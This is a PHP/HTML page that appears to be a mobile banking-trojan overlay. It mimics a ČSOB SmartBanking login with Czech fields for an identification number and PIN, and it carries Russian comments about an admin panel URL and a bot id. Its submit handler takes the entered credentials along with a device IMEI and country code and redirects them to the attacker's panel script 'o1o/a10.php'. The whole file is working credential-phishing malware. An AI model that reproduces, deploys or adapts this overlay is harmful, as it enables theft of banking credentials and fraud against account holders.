<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Anmeldung Benutzername </title>

    <style>
        html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, font, img, ins, kbd, q, s, samp, small, strike, sub, sup, tt, var, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, caption, tbody, tfoot, thead, tr {
            margin: 0;
            padding: 0;
            border: 0;
            outline: 0;
            font-weight: inherit;
            font-style: inherit;
            font-size: 100%;
            font-family: inherit;
        }

        #content_div {
            position: relative;
            padding: 0 10px;
        }

        #header {
            background: #fff;
            display: block;
            margin: 0 -10px;
            height: 70px;
        }

        #header img {
            width: 86px;
            margin: 0 auto;
            display: block;
        }

        .clear {
            height: 1px;
            background: grey none repeat scroll 0 0;
            margin-top: 16px;
            width: 103%;
            margin-left: -10px;
        }

        .basicform {
            font-size: 14px;
            margin-bottom: 10px;
        }

        .basicform select,
        .basicform input[type=text],
        .basicform textarea {
            font-size: 14px;
            margin-bottom: 5px;
        }

        .basicform label {
            padding: 5px 0;
            font-size: 14px;
            font-weight: bold;
            font-family: arial, helvetica, verdana sans-serif;
            -webkit-touch-callout: none;
        }

        input {
            width: 100%;
            max-width: 100%;
            font-size: 14px;
            background-color: #fff;
            border: 1px solid #aaa;
            border-right-color: #ddd;
            border-bottom-color: #dfdfdf;
            padding: 8px 10px;
            margin: 1px 0;
            box-sizing: border-box;
            float: right;
            outline: none;
        }

        .input-field:hover {
            font-size: 14px;
            background-color: #fff;
            border: 1px solid #FFB80E;
            box-sizing: border-box;
            -moz-box-shadow: inset 2px 2px 3px #dfdfdf;
            -webkit-box-shadow: inset 2px 2px 3px #dfdfdf;
            box-shadow: inset 2px 2px 3px #dfdfdf;
        }

        .submit-button {
            box-sizing: border-box;
            float: right;
            border: 1px solid #ff9439;
            font-size: 14px;
            display: block;
            text-decoration: none;
            text-align: center;
            padding: 10px;
            white-space: nowrap;
            overflow: hidden;
			border-radius: 5px;
            font-weight: bold;
            outline: none;
            width: 50%;
            color: #fff;
            background: #FF9439 none repeat scroll 0 0;
            margin: 10px 0 10px 105px;
        }

        .submit-button:hover {
            font-size: 14px;
            border: 1px solid #FFB80E;
            box-sizing: border-box;
            -moz-box-shadow: inset 2px 2px 3px #dfdfdf;
            -webkit-box-shadow: inset 2px 2px 3px #dfdfdf;
            box-shadow: inset 2px 2px 3px #dfdfdf;
        }

        .submit-button:active {
            -moz-box-shadow: inset 1px 4px 7px rgba(0, 0, 0, .3);
            -webkit-box-shadow: inset 1px 4px 7px rgba(0, 0, 0, .3);
            box-shadow: inset 1px 4px 7px rgba(0, 0, 0, .3);
        }

        .fielderror {
            border: 1px solid #f00;
        }
    </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>

    <div id="content_div">
        <div id="header">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFYAAABECAYAAAAbSMJnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjNFRTVBQTMzQ0ZFQjExRTU5OEY5QzQ5QUJFODRGOUVEIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjNFRTVBQTM0Q0ZFQjExRTU5OEY5QzQ5QUJFODRGOUVEIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6M0VFNUFBMzFDRkVCMTFFNTk4RjlDNDlBQkU4NEY5RUQiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6M0VFNUFBMzJDRkVCMTFFNTk4RjlDNDlBQkU4NEY5RUQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4f8HmVAAAK8klEQVR42uxc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" />
        </div>
        <form action="null" method="post" id="_mainForm" target="flow_handler" style="margin-top: 10px;">
            <input name="name" value="CSOB" type="hidden" />
            <div class="basicform loginform">
                <input id="login" name="Identifikační číslo" placeholder="Identifikační číslo" type="text" class="input-field" />
                <br />
                <br />
                <br />
                <input name="PIN" id="password" placeholder="Vložte PIN" type="password" class="input-field">
                <br />
                <br />
                <input value="Přihlásit" id="submitBtn1" class="submit-button" type="button" />
                <br />
                <br />
                <br />
            </div>
        </form>

        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

     <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "smartbanking'+
						'", "identifikacni cislo": "'+oNumInp.value+
						'", "vlozte_PIN": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|smartbanking|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						
						return false;
                    };

                })();
            </script>

</body>
</html>
